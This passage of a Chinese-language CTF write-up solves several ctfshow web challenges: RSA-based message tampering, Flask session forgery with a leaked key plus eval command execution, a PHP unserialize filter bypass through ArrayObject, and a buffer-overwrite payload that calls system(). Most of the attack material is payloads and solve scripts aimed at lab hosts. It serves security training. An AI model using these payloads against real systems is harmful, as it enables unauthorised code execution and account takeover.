9cfd2eac9a766e221c57449efa94e55b17c3bd922f9d6c1ddd79e7b43b27b239cb4c00be876815009dbd8989c470424a5990d1e17a8cc7438fc2fac69d416203f6cfb8332857205212ad72c17fb0b8b301a040ce840de67a9b28e1a1588420f835860162fe767496f64ce28f683ee83b35a37062c6bd48dd4b90e3628987d370664685a0cdc13bb1fc2e8b17b744f9eca3255dcc3ecd455ec6ea29bbfb6cd726b7398eaf3d17f4aec078d591d39e1f0a16c650fbb24dfc384aa04d0aef7f8904ccb26adb9e14da2802af0f1b44eea1acc835abb48bc05ba7a8640ae251ded329f60ef6e2d90ad040317976ead2936c7c6def1214498fab8dc755b81bb6d88f772e1ed913449610ec12a38f2708ea13098e268a2d87314e72b5c74a9a852b91e8ccc35a9279112ac78619fc558116820eed98e70b8f6d1d4ab34ada83ccddd2e33467b6d29a090d65d393c4f1918f650580f0b4e8ad73601987048aa14f1713116a4baaa8a72edbd9e902f0d4dce0bf33edec29451194f41c6c8c5422001f9aa8929d279b43e878e6ad17cfa8626e89a776a23e2a3ce925b9268b923190e2ba279f67d2355a2f3c98576ea0c6944bfae2a1945607414cd32f7eac0714e70fac763e183ec1b745f68b03a3ca9ccae7649b7977dcbf204b4ced74b6a7b3345f5ec7f39240c3d0e3194c413d7d9f367de93a6681318dbfc28de604c40754319f77d6c2d607daeb7b2b87e39cb6d978b995a33ba4f7414ee53956a953b7271962fd8c76cbce84912ffb005ebea6c77639cdba405e968ef746bd9e3228dc0da52698d79ef6a21c93398306d4a93255be6e8e127db6333ca420bd144ac64c13ddebd940c058e983964c0cbafc4342f007a63e17e299c324fb9751226cc6df6d50ba2a50cb90c7ee41460d002954f86388e60c1b3eddf55f0d12faab142a5f54bbd392b5356df12f06b470eae2ace3655dd99ca7a47cf1ef4afab70d9f8e3751211759ef7ecc3746782ee8c6e8bb6daed77643526b8ee5aae2afa6a6b61179e432dd85262e581247de409d80e3094f5d24cae5bfa03e28f6d886d4a5a537fc6419bf577bdbda4e4c8e8877d60f710f3182ca0649518de119ade1f3364400b742b886ccb9369c839d9a2df82a40eebae502c9f19c936df0a79b68b555fa578af472946b7f820ced3beb74d0e329479ec87e7845c9f13d5474f6f04023860c9d05c21d528ff4d8874a59900e743560aa7926d65b9b1ff83d1a817fdd10aa24f390b02d9c1f745752f87081034be140516217b60433197adaf60f7eda650c08802ff8fc27322dbb72bb19086aef2adb63ba29c0ed913822014a361845aa2fe1cb5a30f9ba1f2a24c01f7dca3099ce12cd15e586a86c8f286339aa4dcf022726fad15639562059ae118744bb81310d9dcba153eed0f918f58077b449be60ee18c9cee868c23c396c9f66b2064bfc7114c4eab207bf2f6536ba0fd05435cb861db39278a8b46dc4673d432592c9c153840c94d3d3ef867d76977065597f700b7e1c70654939769efbc5f263b9d0ad9dd1835945948ed09ab40c6e28c9a089d6a8152a929b7142e0a4eef38518185f7fd4556d40d8a9c16b135c1dd941703a6c9384a88ec2c1835ca1d895be51b2ed1a8f675d6cb88ef9a4a7ae981725a9af09b73603f0c4342119668c79df73d68dc4eb157223d8193e85f9917c1c6f378cdc7b042eb18588faacdea994ec599f138fb74fd53494bf6e5d34a5949be6f750dd87e8a854b25a6969b1021eb3e81d6c74be02d95789bdca6fde4bc29d345d42e3e124981f0ea221e4601e95c72b44a6b078eb9e3fcd098f903617b69cab1110615701965a901d9197563595157bfc17e280b8b1e0edc7d3d424d52e6e55f8d44dff6c1685c349bebb6a976fd29658877ed409584ad2c75e9dda60de23607c32e633bd1f20e60f6dd70a8c1045686b1745d4e212c99e31d08bdc5f45550439357b73d20fdf9e92
```

#### 2.payload：一把梭脚本

```python
import re
import requests
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
from flask import Flask, request, abort

url = 'http://2c5da381-d8ac-4d1b-8918-dc3ebde25791.challenge.ctf.show/'  # 题目URL，先等几秒再运行


# 加密
def encrypt(plaintext, public_key):
    cipher = PKCS1_v1_5.new(RSA.importKey(public_key))

    ciphertext = ''
    for i in range(0, len(plaintext), 128):
        ciphertext += cipher.encrypt(plaintext[i:i + 128].encode('utf-8')).hex()

    return ciphertext


def get_plaintext_half():
    text = requests.get(url + '/update').text
    return re.findall('[^@]*\.92', text)[0]


def get_public_key(public_key):
    text = requests.get(url + '/shop?a # 获取解密后的数据pi=127.0.0.1:9999').text
    return re.findall('-----BEGIN PUBLIC KEY-----\n.*\n.*\n.*\n.*\n.*\n.*\n.*\n-----END PUBLIC KEY-----', text)[
        public_key - 1]


IP = '2.56.12.89'
plaintext_half = get_plaintext_half()
# 获取公钥2、3
public_key2 = get_public_key(2).replace('\n', '').replace('-----BEGIN PUBLIC KEY-----',
                                                          '-----BEGIN PUBLIC KEY-----\n').replace(
    '-----END PUBLIC KEY-----', '\n-----END PUBLIC KEY-----')
public_key3 = get_public_key(3).replace('\n', '').replace('-----BEGIN PUBLIC KEY-----',
                                                          '-----BEGIN PUBLIC KEY-----\n').replace(
    '-----END PUBLIC KEY-----', '\n-----END PUBLIC KEY-----')

# 两次加密
IP_ciphertext = encrypt(IP, public_key3)
IP_ciphertext = encrypt(IP_ciphertext, public_key2)

# 替换最终IP
plaintext_half_new = plaintext_half[:2048] + IP_ciphertext + plaintext_half[4096:]

# 请求
requests.post(url + '/pass_message', data={'message': plaintext_half_new})
# 接收明文
text = requests.get(url + '/update').text
flag = re.findall('ctfshow{.*}', text)[0]
print(flag)
input()
```

## easy_flask

#### flask的session伪造+任意文件下载+python命令执行

#### 1.做题思路

##### 1.先去注册，用户名输入admin，返回Account already exists!，说明存在admin用户，但是这题明显不是让你爆破密码

##### 2.注册新用户，然后返回登录。

##### 3.登录页面，发现一个learn链接，但是下面也有提示，某些功能只对admin开放。点进learn链接看看

通过learn页面，发现了session的密钥，可以尝试进行session伪造

```
app.secret_key = 'S3cr3tK3y'
```

关键代码

```python
def login():
msg = ''
if request.method == 'POST' and 'username' in request.form and 'password' in request.form:
username = request.form['username']
password = request.form['password']
if username in users and password == users[username]['password']:
session['loggedin'] = True
session['username'] = username
session['role'] = users[username]['role']
return redirect(url_for('profile'))
else:
msg = 'Incorrect username/password!'
return render_template('login.html', msg=msg)
```

##### 4.进行session伪造

```
python3 flask_session_cookie_manager3.py encode -s 'S3cr3tK3y' -t "{'loggedin': True, 'role': 'admin', 'username': 'admin'}"

.eJyrVsrJT09PTcnMU7IqKSpN1VEqys9JVbJSSkzJBYrpKJUWpxblJeYihGoBzOYRgA.ZDKUZA.VrSPdJ2nKesTJFDJucQqPXODP0M
```

##### 5.抓包，修改cookie的session值，改为刚才伪造的值，然后返回页面

##### 6.下载文件，发现是一个文本文件，内容为flag{fake_flag}

这个时候抓包看一下，发现文件名为fakeflag.txt，明显是愚人节愚人啦

只能再想想还有没有忽略的点，又去看了learn链接的代码，发现了被注释的app.py

##### 7.下载app.py，得到源码，发现关键代码

![](/images/easy_flask.png)

需要get传参，但是因为源代码没有调用os库，需要payload加一下，传参之后得到flag

这里贴一下app.py源码~

```python
# app.py
from flask import Flask, render_template, request, redirect, url_for, session, send_file, Response

import os
app = Flask(__name__)

app.secret_key = 'S3cr3tK3y'

users = {
    'admin': {'password': 'LKHSADSFHLA;KHLK;FSDHLK;ASFD', 'role': 'admin'}
}


@app.route('/')
def index():
    # Check if user is loggedin
    if 'loggedin' in session:
        return redirect(url_for('profile'))
    return redirect(url_for('login'))


@app.route('/login/', methods = ['GET', 'POST'])
def login():
    msg = ''
    if request.method == 'POST' and 'username' in request.form and 'password' in request.form:
        username = request.form['username']
        password = request.form['password']
        if username in users and password == users[username]['password']:
            session['loggedin'] = True
            session['username'] = username
            session['role'] = users[username]['role']
            return redirect(url_for('profile'))
        else:
            msg = 'Incorrect username/password!'
    return render_template('login2.html', msg = msg)


@app.route('/register/', methods = ['GET', 'POST'])
def register():
    msg = ''
    if request.method == 'POST' and 'username' in request.form and 'password' in request.form:
        username = request.form['username']
        password = request.form['password']
        if username in users:
            msg = 'Account already exists!'
        else:
            users[username] = {'password': password, 'role': 'user'}
            msg = 'You have successfully registered!'
    return render_template('register2.html', msg = msg)


@app.route('/profile/')
def profile():
    if 'loggedin' in session:
        return render_template('profile2.html', username = session['username'], role=session['role'])
    return redirect(url_for('login'))


@app.route('/show/')
def show():
    if 'loggedin' in session:
        return render_template('show2.html')


@app.route('/download/')
def download():
    if 'loggedin' in session:
        filename = request.args.get('filename')
        if 'filename' in request.args:
            return send_file(filename, as_attachment = True)

    return redirect(url_for('login'))


@app.route('/hello/')
def hello_world():
    try:
        s = request.args.get('eval')
        return f"hello,{eval(s)}"
    except Exception as e:
        print(e)
        pass

    return "hello"


@app.route('/logout/')
def logout():
    session.pop('loggedin', None)
    session.pop('id', None)
    session.pop('username', None)
    session.pop('role', None)
    return redirect(url_for('login'))


if __name__ == "__main__":
    app.run(host = '0.0.0.0', port = 8080)
```



#### 2.payload

```
URL+/hello/?eval=__import__("os").popen("cat /flag_is_h3re").read()
```

## easy_php

```php
error_reporting(0);
highlight_file(__FILE__);

class ctfshow{

    public function __wakeup(){
        die("not allowed!");
    }

    public function __destruct(){
        system($this->ctfshow);
    }

}

$data = $_GET['1+1>2'];

if(!preg_match("/^[Oa]:[\d]+/i", $data)){
    unserialize($data);
}


?>
```

#### 1.题目分析

只要执行`__destruct()`中的`system`函数，给`ctfshow`赋值即可

但是对data进行了过滤，不能传入以O和a开头的序列化值,也就是对象和数组的序列化值。

感觉这个题的难点，就是不太会绕过Oa，

题目中的ctfshow类未实现serializable接口，所以不能解析该属性。所以找php中内置的实现了Serializable接口的类

wp使用了ArrayObject()类，使用这个类去修饰ctfshow类

#### 2.知识点

- ##### O标识符代表对象类型，而C标识符代表类名类型。如果将O替换为C，则在反序列化时会将其解释为一个新的类名字符串，从而创建一个新的类而不是对象。因为这个新的类没有被序列化过，所以它没有任何属性或方法。因此在反序列化时，__wakeup等一些魔术方法就不会被自动调用。但是可以利用有接口Serializable的类，来进行修饰，从而可以利用魔术方法。比如ArrayObject类。

```
O:6:"Person":2:{s:3:"age";i:18;s:4:"name";s:3:"lxy";}
“O”：对象
“6”：对象的类名长度
“Person”：对象名
“2”：对象中有2个变量。
s:4:"name";s:3:"lxy"：
“s”：变量类型，为string对象；s:4:"name"：变量名长度和变量名，
s:3:"lxy"：变量的值和值的长度。
```

- ##### 在php低版本中，O或a的冒号后的数字前可以加一个+来进行绕过，题目版本7.3无法绕过。

```
C:11:"ArrayObject":37:{x:i:0;a:2:{i:0;i:0;i:1;i:1;};m:a:0:{}}

37：括号内的字符数
x:i:0;：结构中的nr_flags字段
a:2:{i:0;i:0;i:1;i:1;}：结构中的数组字段(从这个角度,它被称为internal数组以区别于对象本身)
m:a:0:{}：zend_object std字段内的properties字段(从这个角度,称为members数组)。
```

#### 3.payload

```php
# payload1:官方
?1%2b1>2=C:11:"ArrayObject":67:{x:i:0;O:7:"ctfshow":1:{s:7:"ctfshow";s:12:"cat /f1agaaa";};m:a:0:{}}

# payload2:
?1%2b1>2=C:11:"ArrayObject":87:{x:i:0;a:1:{s:7:"ctfshow";O:7:"ctfshow":1:{s:7:"ctfshow";s:12:"cat /f1agaaa";}};m:a:0:{}}

class ctfshow
{
  public $ctfshow = 'cat /f1agaaa';
}

$ctfshow_obj = new ctfshow();
$array_obj = new ArrayObject();
$array_obj['ctfshow'] = $ctfshow_obj;

$serialized_str = serialize($array_obj);
echo $serialized_str;

// C:11:"ArrayObject":87:{x:i:0;a:1:{s:7:"ctfshow";O:7:"ctfshow":1:{s:7:"ctfshow";s:12:"cat /f1agaaa";}};m:a:0:{}}

// 首先，定义了一个名为 ctfshow 的类，并在其中定义了一个名为 ctfshow 的公共属性，其值为cat /f1agaaa。然后，实例化 ctfshow 类，将其赋值给 $array_obj 对象的 ctfshow 属性。
// 注意，因为 $array_obj 是一个 ArrayObject 对象，所以需要使用数组的形式来赋值，即 $array_obj['ctfshow']。
// 最后，使用 serialize() 函数将 $array_obj 序列化为字符串，并将其输出。
```

## easy_class

```php
namespace ctfshow;

class C{

    const __REF_OFFSET_1 = 0x41;
    const __REF_OFFSET_2 = 0x7b;
    const __REF_OFFSET_3 = 0x5b;
    const __REF_OFFSET_4 = 0x60;
    const __REF_OFFSET_5 = 0x30;
    const __REF_OFFSET_6 = 0x5f;

    const __REF_SIZE__= 20;
    const __REF_VAL_SIZE__= 50;

    private $cursor=0;
    private $cache;
    private $ref_table=[];

    

    function main(){
        $flag = md5(file_get_contents("/flag"));
        $this->define('ctfshow',self::__REF_VAL_SIZE__);
        $this->define('flag',strlen($flag));
        $this->neaten();
        $this->fill('flag',$flag);
        $this->fill('ctfshow',$_POST['data']);
        
        if($this->read('ctfshow')===$this->read('flag')){
            echo $flag;
        }
    }

    private function fill($ref,$val){
        rewind($this->cache);
        fseek($this->cache, $this->ref_table[$ref]+23);


        $arr = str_split($val);

        foreach ($arr as $s) {
            fwrite($this->cache, pack("C",ord($s)));
        }

        for ($i=sizeof($arr); $i < self::__REF_VAL_SIZE__; $i++) { 
            fwrite($this->cache, pack("C","\x00"));
        }

        $this->cursor= ftell($this->cache);
    }

    public static function clear($var){
        ;
    }

    private function neaten(){
        $this->ref_table['_clear_']=$this->cursor;
        $arr = str_split("_clear_");
        foreach ($arr as $s) {
            $this->write(ord($s),"C");
        }
        for ($i=sizeof($arr); $i < self::__REF_SIZE__; $i++) { 
            $this->write("\x00",'C');
        }

        $arr = str_split(__NAMESPACE__."\C::clear");
        foreach ($arr as $s) {
            $this->write(ord($s),"C");
        }

        $this->write(0x36d,'Q');
        $this->write(0x30,'C');

        for ($i=1; $i < self::__REF_SIZE__; $i++) { 
            $this->write("\x00",'C');
        }


    }

    private function readNeaten(){
        rewind($this->cache);
        fseek($this->cache, $this->ref_table['_clear_']+self::__REF_SIZE__);
        $f = $this->truncation(fread($this->cache, self::__REF_SIZE__-4));
        $t = $this->truncation(fread($this->cache, self::__REF_SIZE__-12));
        $p = $this->truncation(fread($this->cache, self::__REF_SIZE__));
        call_user_func($f,$p);

    }

    private function define($ref,$size){
        
        $this->checkRef($ref);
        $r = str_split($ref);
        $this->ref_table[$ref]=$this->cursor;
        foreach ($r as $s) {
            $this->write(ord($s),"C");
        }
        for ($i=sizeof($r); $i < self::__REF_SIZE__; $i++) { 
            $this->write("\x00",'C');
        }


        fwrite($this->cache,pack("v",$size));
        fwrite($this->cache,pack("C",0x31));
        $this->cursor= ftell($this->cache);

        for ($i=0; $i < $size; $i++) { 
            $this->write("\x00",'a');
        }
        
    }

    private function read($ref){

        if(!array_key_exists($ref,$this->ref_table)){
            throw new \Exception("Ref not exists!", 1);
        }

        if($this->ref_table[$ref]!=0){
            $this->seekCursor($this->ref_table[$ref]);
        }else{
            rewind($this->cache);
        }
        
        $cref = fread($this->cache, 20);
        $csize = unpack("v", fread($this->cache, 2));
        $usize = fread($this->cache, 1);

        $val = fread($this->cache, $csize[1]);

        return $this->truncation($val);

        
    }


    private function write($val,$fmt){
        $this->seek();
        fwrite($this->cache,pack($fmt,$val));
        $this->cursor= ftell($this->cache);
    }

    private function seek(){
        rewind($this->cache);
        fseek($this->cache, $this->cursor);
    }

    private function truncation($data){

        return implode(array_filter(str_split($data),function($var){
            return $var!=="\x00";
        }));

    }
    private function seekCursor($cursor){
        rewind($this->cache);
        fseek($this->cache, $cursor);
    }
    private function checkRef($ref){
        $r = str_split($ref);

        if(sizeof($r)>self::__REF_SIZE__){
            throw new \Exception("Refenerce size too long!", 1);
        }

        if(is_numeric($r[0]) || $this->checkByte($r[0])){
            throw new \Exception("Ref invalid!", 1);
        }

        array_shift($r);

        foreach ($r as $s) {

            if($this->checkByte($s)){
                throw new \Exception("Ref invalid!", 1);
            }
        }
    }

    private function checkByte($check){
        if(ord($check) <=self::__REF_OFFSET_5 || ord($check) >=self::__REF_OFFSET_2 ){
            return true;
        }

        if(ord($check) >=self::__REF_OFFSET_3 && ord($check) <= self::__REF_OFFSET_4 
            && ord($check) !== self::__REF_OFFSET_6){
            return true;
        }

        return false;

    }

    function __construct(){
        $this->cache=fopen("php://memory","wb");
    }

    public function __destruct(){
        $this->readNeaten();
        fclose($this->cache);
    }

}
highlight_file(__FILE__);
error_reporting(0);
$c = new C;

$c->main();
```

#### 1.代码分析

```
这段代码命名空间为ctfshow，它定义了一个名为 C 的类，并且包含了一些常量和方法。

C类：
私有成员变量 $cursor：表示当前的缓冲区指针位置。
$cache 成员变量，是一个 PHP 文件句柄，用于存储和读取数据。
常量 __REF_OFFSET_1 到 __REF_OFFSET_6，值都是一个字节，用于后面的一些操作。
__REF_SIZE__ 和 __REF_VAL_SIZE__，分别表示引用的大小和值的大小。

main()方法从 /flag 文件中读取 MD5 值，并通过 define 方法定义了两个引用 ctfshow 和 flag，分别对应用户 POST 请求中的 data 和文件 MD5 值。然后它通过 fill 方法向缓冲区中填写数据。最后，通过 read 方法比较两个引用的值，如果相等就输出 flag。

define()方法检查引用的长度是否超过限制，并将引用的名称和大小写入缓冲区。然后填写一个字节的 0x31 和引用的值的大小，以及一个指向数据的指针。这个方法还会在缓冲区中分配一段空间用于存储引用的值。

fill()方法会将数据写入缓冲区，并用 0x00 填充缓冲区的剩余部分。

read()方法会读取指定引用的值，并返回。它会检查引用是否存在，并从缓冲区中读取引用的值和大小。

neaten()方法会在缓冲区中创建一个 _clear_ 的引用和一个指向 C::clear 方法的指针，它还会写入一些空字节用于对齐。

readNeaten()方法会从缓冲区中读取 _clear_ 的值，并调用 C::clear 方法。

write()方法会将指定值写入缓冲区，并更新缓冲区的指针位置。

seek()方法会将缓冲区的指针位置设置为当前的 $cursor。

truncation()方法会将字节串中的空字节去除。

checkRef()方法会检查引用的长度是否超过限制，并且检查引用的第一个字符是否为数字。如果检查失败，它会抛出一个异常。
```

#### 2.payload

```python
import requests


url = "http://e89d2c6d-e01e-4fef-9510-bf760aa69af6.challenge.ctf.show/"

data = {
        "data":"A"*50+"flag"+"\x00"*19+"B"*32+"\x00"*20+"system"+"\x00"*18+"cat /f1agaaa"+"\x00"*8
}


response = requests.post(url=url,data=data)

print(response.text)


"A"*50+"flag"：A字符重复 50 次，再拼接上字符串 "flag"，满足服务器对输入数据长度的限制。
"\x00"*19：空字符 (\x00) 重复 19 次，这些空字符用于填充数据，使得数据长度达到要求。
"B"*32：B字符重复 32 次，满足输入长度的限制。
"\x00"*20：空字符重复 20 次。
"system"：表示需要执行系统命令。
"\x00"*18：空字符重复 18 次。
"cat /f1agaaa"：需要执行的系统命令，即读取 /f1agaaa 文件的内容。
"\x00"*8：加上 8 个空字符填充数据。
构造一个长度符合要求的字符串，将其中的部分内容作为系统命令进行执行，从而获取flag。
```

